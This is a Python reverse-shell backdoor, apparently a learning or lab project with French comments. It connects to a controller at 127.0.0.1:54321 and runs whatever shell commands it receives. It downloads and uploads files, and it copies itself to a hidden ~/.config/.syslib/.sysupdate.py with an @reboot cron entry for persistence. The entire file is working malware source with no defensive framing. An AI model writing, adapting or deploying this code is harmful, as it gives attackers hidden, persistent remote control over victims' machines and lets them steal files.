import socket
import json
import subprocess
import os
import shutil

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 54321))

def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode())

def reliable_recv():
	data = ""
	
	while True:
		try:
			data += sock.recv(4096).decode()
			return json.loads(data)

		except ValueError:
			continue

def hide():
	hidden_dir = os.path.expanduser("~/.config/.syslib")
	os.makedirs(hidden_dir, exist_ok=True)

	dest = os.path.join(hidden_dir, ".sysupdate.py")

	shutil.copy2(__file__, dest)
	
	os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {dest}") | crontab -')

	print(f"[+] Caché dans {dest} et persistant via cron")

def shell():
	while True:
		command = reliable_recv()
		
		if command == 'q':
			break

		elif command.startswith('cd '):
			try:
				os.chdir(command[3:].strip())
				reliable_send(f"[+] Répertoire : {os.getcwd()}")
			except Exception as e:
				reliable_send(f"[-] Erreur : {str(e)}")

		elif command.startswith('download '):
			filepath = command[9:].strip()

			try:
				with open(filepath, 'rb') as f:
					reliable_send(f.read().decode('latin-1'))

			except Exception as e:
				reliable_send(f"[-] Erreur : {str(e)}")

		elif command.startswith('upload '):
			filename = command[7:].strip()
			reliable_send('READY')
			data = reliable_recv()

			if data == 'ERROR':
				pass
			else:
				try:
					with open(filename, 'wb') as f:
						f.write(data.encode('latin-1'))
					
					reliable_send(f"[+] Fichier reçu : {filename}")
				
				except Exception as e:
					reliable_send(f"[-] Erreur : {str(e)}")

		else:
			result = subprocess.getoutput(command)
			reliable_send(result)

hide()   # active le hiding au démarrage
shell()
sock.close()





